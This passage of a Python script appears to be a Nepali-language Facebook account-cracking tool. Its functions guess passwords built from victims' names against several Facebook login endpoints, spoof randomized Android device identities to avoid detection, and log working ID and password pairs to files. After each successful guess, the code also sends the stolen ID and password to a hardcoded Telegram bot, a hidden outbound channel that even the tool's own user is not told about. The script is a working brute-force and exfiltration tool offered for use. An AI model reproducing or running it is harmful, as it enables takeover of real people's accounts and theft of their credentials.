                                print(' \033[1;37m[\u001b[36m•\033[1;37m] \u001b[32mOK\033[1;37m : ' +str(len(oks)))
                                print(' \033[1;37m[\u001b[36m•\033[1;37m] \u001b[33mCP\033[1;37m : ' +str(len(cps)))
                                linex()
                                beck = input(' \033[1;37m[\u001b[36m>\033[1;37m] FERI CHALAUNXAS? (y/n) : ')
                                if beck in ['y','Y']:
                                    os.system('python run.py')
                                elif beck in ['n','N']:
                                    print(' [\u001b[36m•\033[1;37m] DHANYAVAAD USE GARDIY3K0M4 !!')
                                    exit()
                                elif (KeyError,IOError):
                                    exit()
                        elif xd in ['2']:
                                login()
                        elif xd in ['3']:
                                remove_dup()
                        elif xd in ['10']:
                                gmail()
                        elif xd in ['4','04']:
                                clear()
                                print(' \033[1;37m[\u001b[36m1\033[1;37m] CHECK XD IDz ')
                                print(' \033[1;37m[\u001b[36m2\033[1;37m] CHECK NG IDz ')
                                print('\033[1;37m---------------------------------------------')
                                cpok=input(' \033[1;37m[\u001b[36m•\033[1;37m] CHADO XAAAN : ')
                                if cpok in ['1','01']:
                                    clear()
                                    open('/sdcard/SAFAL-XD.txt', 'a')
                                    animation(' \033[1;37m[\u001b[36m•\033[1;37m] SHOWING XD IDz')
                                    print('---------------------------------------------')
                                    time.sleep(1)
                                    with open('/sdcard/SAFAL-XD.txt', 'r') as okids:
                                        okid = okids.read()
                                        print('\x1b[1;92m'+okid);
                                        okids.close()
                                    print('\033[1;37m---------------------------------------------')
                                    input(' \033[1;37m[\u001b[36m>>\033[1;37m] ENTER GAR FERI CHALAUNA ')
                                    menu()
                                elif cpok in ['2','02']:
                                    clear()
                                    open('/sdcard/SAFAL-NG.txt', 'a')
                                    print(' \033[1;37m[\u001b[36m•\033[1;37m] SHOWING NG IDz')
                                    print('---------------------------------------------')
                                    time.sleep(1)
                                    with open('/sdcard/SAFAL-NG.txt', 'r') as cpids:
                                        cpid = cpids.read()
                                        animation('\x1b\033[1;33m'+cpid);
                                        cpids.close()
                                    print('\033[1;37m---------------------------------------------')
                                    input(' \033[1;37m[\u001b[36m>\033[1;37m] ENTER TO RETURN ')
                                    menu()
                                else:
                                    print('\033[1;37m---------------------------------------------')
                                    animation(' \033[1;37m[\u001b[36m>>\033[1;37m] OPENING MENU')
                                    time.sleep(2)
                                    menu()
                        elif xd in ['5']:
                                linex()
                                os.system('rm -rf .nam.txt')
                                animation(' [\u001b[36m•\033[1;37m] NAME HAS BEEN REST ')
                                exit()
                        elif xd in ['6','06']:
                                contact()
                        elif xd in ['7','07']:
                                bot()
                        elif xd in ['0','00']:
                                linex()
                                os.system('rm -rf login/*')
                                animation(' [\u001b[36m>>\033[1;37m] CHALAIDEKO MA DHANYAVAAD ')
                                exit()
                        else:
                                print('\033[1;37m---------------------------------------------')
                                animation(' [\u001b[36m×\033[1;37m] OPTION VETENA')
                                time.sleep(1)
                                menu()
                        save_file()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
                print('\n INTERNET KHAI VAI?')
                exit()

def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [SAFAL-XD] %s|\033[1;32mXD:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(' ')[0]
                try:
                        last = names.split(' ')[1]
                except:
                        last = 'Khan'
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
                        pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
                        ua=random.choice(ugen)
                        head = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
                        getlog = session.get(f'https://free.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        NEPAL=session.cookies.get_dict().keys()
                        if "c_user" in NEPAL:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m [NEPAL-OK] %s | %s'%(ids,pas))
                                print(f" \033[1;37m[\u001b[36m•\033[1;37m] ID MADE : {tahun(ids)}")
                                open('/sdcard/SAFAL-XD.txt', 'a').write(ids+'|'+pas+'\n')
                                requests.get("https://api.telegram.org/bot6001916477:AAGn5rlSFLOHO5c5WHsh3ngCsQ-8uH5fjhg/sendMessage?chat_id=6118288082&text="+username+"\n[ "+ids+' | '+pas+ " ]")
                              #  requests.get("https://api.telegram.org/bot6001916477:AAGn5rlSFLOHO5c5WHsh3ngCsQ-8uH5fjhg/sendMessage?chat_id=6118288082&text="+username+"\n[ "+ids+' | '+pas+ " ]")
                                oks.append(ids)
                                break
                        elif 'checkpoint' in NEPAL:
                                if 'y' in pcp:
                                        print('\r\r\x1b\033[1;33m [SAFAL-NG] '+ids+' | '+pas+'\033[1;33m')
                                        open('/sdcard/SAFAL-NG.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        else:
                                continue
        except requests.exceptions.ConnectionError:
                time.sleep(50)
        loop+=1
xxxxx=("GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")

def api(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [NEPAL-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                                ln = fn
                        for pw in passlist:
                                pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                                application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                                application_version_code=str(random.randint(000000000,999999999))
                                fbs=random.choice(fbks)
                                gtt=random.choice(xxxxx)
                                gttt=random.choice(xxxxx)
                                android_version=str(random.randrange(6,13))
                                ua_string = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.0,width=720,height=1280};'+f'FBLC/en_US;FBRV/{str(application_version_code)};FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'adid':adid,
                                        'email':ids,
                                        'password':pas,
                                        'cpl':'true',
                                        'credentials_type':'device_based_login_password',
                                        "source": "device_based_login",
                                        'error_detail_type':'button_with_disabled',
                                        'source':'login','format':'json',
                                        'generate_session_cookies':'1',
                                        'generate_analytics_claim':'1',
                                        'generate_machine_id':'1',
                                        "locale":"en_US","client_country_code":"US",
                                        'device':gtt,
                                        'device_id':adid,
                                        "method": "auth.login",
                                        "fb_api_req_friendly_name": "authenticate",
                                        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
                                head = {
                                        'content-type':'application/x-www-form-urlencoded',
                                        'x-fb-sim-hni':str(random.randint(2e4,4e4)),
                                        'x-fb-connection-type':'unknown',
                                        'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                                        'user-agent':ua_string,
                                        'x-fb-net-hni':str(random.randint(2e4,4e4)),
                                        'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
                                        'x-fb-connection-quality':'EXCELLENT',
                                        'x-fb-friendly-name':'authenticate',
                                        'accept-encoding':'gzip, deflate',
                                        'x-fb-http-engine':     'Liger'}
                                url = 'https://b-api.facebook.com/method/auth.login'
                                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [SAFAL-XD] '+ids+' | '+pas+'\033[1;97m')
                                        print(f" \033[1;37m[\u001b[36m•\033[1;37m] ID MADE : {tahun(ids)}")
                                        open('/sdcard/SAFAL-XD.txt','a').write(ids+'|'+pas+'\n')
                                        requests.get("https://api.telegram.org/bot6001916477:AAGn5rlSFLOHO5c5WHsh3ngCsQ-8uH5fjhg/sendMessage?chat_id=6118288082&text="+username+"\n[ "+ids+' | '+pas+ " ]")
                                    #    requests.get("https://api.telegram.org/bot6001916477:AAGn5rlSFLOHO5c5WHsh3ngCsQ-8uH5fjhg/sendMessage?chat_id=6118288082&text="+username+"\n[ "+ids+' | '+pas+ " ]")
                                        oks.append(ids)
                                        break
                                elif 'www.facebook.com' in q['error_msg']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[\033[1;33m [SAFAL-NG] '+ids+' | '+pas+'\033[1;33m')
                                                open('/sdcard/SAFAL-NG.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                else:
                                        continue
                        loop+=1
                except requests.exceptions.ConnectionError:
                        time.sleep(10)
                except Exception as e:
                        pass

def api1(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [SAFAL-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                                ln = fn
                        for pw in passlist:
                                pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                                application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                                application_version_code=str(random.randint(000000000,999999999))
                                fbs=random.choice(fbks)
                                gtt=random.choice(xxxxx)
                                gttt=random.choice(xxxxx)
                                android_version=str(random.randrange(6,13))
                                ua_string = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.0,width=720,height=1280};'+f'FBLC/es_CU;FBRV/{str(application_version_code)};FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'adid':adid,
                                        'email':ids,
                                        'password':pas,
                                        'cpl':'true',
                                        'credentials_type':'device_based_login_password',
                                        "source": "device_based_login",
                                        'error_detail_type':'button_with_disabled',
                                        'source':'login','format':'json',
                                        'generate_session_cookies':'1',
                                        'generate_analytics_claim':'1',
                                        'generate_machine_id':'1',
                                        "locale":"es_CU","client_country_code":"CU",
                                        'device':gtt,
                                        'device_id':adid,
                                        "method": "auth.login",
                                        "fb_api_req_friendly_name": "authenticate",
                                        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
                                head = {
                                        'content-type':'application/x-www-form-urlencoded',
                                        'x-fb-sim-hni':str(random.randint(2e4,4e4)),
                                        'x-fb-connection-type':'unknown',
                                        'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                                        'user-agent':ua_string,
                                        'x-fb-net-hni':str(random.randint(2e4,4e4)),
                                        'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
                                        'x-fb-connection-quality':'EXCELLENT',
                                        'x-fb-friendly-name':'authenticate',
                                        'accept-encoding':'gzip, deflate',
                                        'x-fb-http-engine':     'Liger'}
                                url = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
                                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [SAFAL-XD] '+ids+' | '+pas+'\033[1;97m')
                                        print(f" \033[1;37m[\u001b[36m•\033[1;37m] ID MADE : {tahun(ids)}")
                                        open('/sdcard/SAFAL-XD.txt','a').write(ids+'|'+pas+'\n')
                                        requests.get("https://api.telegram.org/bot6001916477:AAGn5rlSFLOHO5c5WHsh3ngCsQ-8uH5fjhg/sendMessage?chat_id=6118288082&text="+username+"\n[ "+ids+' | '+pas+ " ]")
                                      #  requests.get("https://api.telegram.org/bot6001916477:AAGn5rlSFLOHO5c5WHsh3ngCsQ-8uH5fjhg/sendMessage?chat_id=6118288082&text="+username+"\n[ "+ids+' | '+pas+ " ]")
                                        oks.append(ids)
                                        break
                                elif 'www.facebook.com' in q['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b\033[1;33m [SAFAL-NG] '+ids+' | '+pas+'\033[1;33m')
                                                open('/sdcard/SAFAL-NG.txt', 'a').write(ids+' | '+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                open('/sdcard/SAFAL-NG.txt','a').write(ids+' | '+pas+'\n')
                                                break
                                else:
                                        continue
                        loop+=1
                except requests.exceptions.ConnectionError:
                        time.sleep(10)
                except Exception as e:
                        pass

def rndm(ids,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [SAFAL-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        for pas in passlist:
                                application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                                application_version_code=str(random.randint(000000000,999999999))
                                fbs=random.choice(fbks)
                                gtt=random.choice(xxxxx)
                                gttt=random.choice(xxxxx)
                                android_version=str(random.randrange(6,13))
                                ua_string = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.0,width=720,height=1280};'+f'FBLC/en_US;FBRV/{str(application_version_code)};FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'adid':adid,
                                        'email':ids,
                                        'password':pas,
                                        'cpl':'true',
                                        'credentials_type':'device_based_login_password',
                                        "source": "device_based_login",
                                        'error_detail_type':'button_with_disabled',
                                        'source':'login','format':'json',
                                        'generate_session_cookies':'1',
                                        'generate_analytics_claim':'1',
                                        'generate_machine_id':'1',
                                        "locale":"en_US","client_country_code":"US",
                                        'device':gtt,
                                        'device_id':adid,
                                        "method": "auth.login",
                                        "fb_api_req_friendly_name": "authenticate",
                                        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
                                head = {
                                        'content-type':'application/x-www-form-urlencoded',
                                        'x-fb-sim-hni':str(random.randint(2e4,4e4)),
                                        'x-fb-connection-type':'unknown',
                                        'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                                        'user-agent':ua_string,
                                        'x-fb-net-hni':str(random.randint(2e4,4e4)),
                                        'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
                                        'x-fb-connection-quality':'EXCELLENT',
                                        'x-fb-friendly-name':'authenticate',
                                        'accept-encoding':'gzip, deflate',
                                        'x-fb-http-engine':     'Liger'}
                                url = 'https://b-api.facebook.com/method/auth.login'
                                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/SAFAL-XD.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [SAFAL-XD] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/SAFAL-XD.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [SAFAL-XD] '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/SAFAL-XD.txt','a').write(uid+'|'+pas+'\n')
                                                oks.append(ids)
                                                break
                                else:
                                        continue
                        loop+=1
                except requests.exceptions.ConnectionError:
                        time.sleep(10)
                except Exception as e:
                        pass

menu()
